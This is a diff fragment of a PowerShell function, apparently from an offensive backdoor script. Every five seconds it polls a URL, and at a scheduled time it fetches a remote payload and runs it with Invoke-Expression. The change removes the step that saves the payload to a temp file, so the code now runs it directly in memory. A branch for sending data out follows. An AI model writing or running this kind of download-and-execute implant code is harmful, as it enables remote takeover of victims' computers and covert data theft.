@@ -87,14 +87,14 @@ function Logic-Execute-OnTime ($URL, $time, $CheckURL, $StopString, $dev_key, $u
     while($true)
     {
         start-sleep -seconds 5 
+        $webclient = New-Object System.Net.WebClient
         $filecontent = $webclient.DownloadString("$CheckURL")
         $systime = Get-Date -UFormat %R
         if ($systime -match $time)
         {
-            $webclient = New-Object System.Net.WebClient 
-            $file = "$env:temp\time_payload.ps1"
-            $webclient.DownloadFile($URL,$file) 
-            $pastevalue = Invoke-Expression $file
+            
+            $pastevalue = Invoke-Expression $webclient.DownloadString($URL)
+            $pastevalue
             $exec++
             if ($exfil -eq $True)
             {
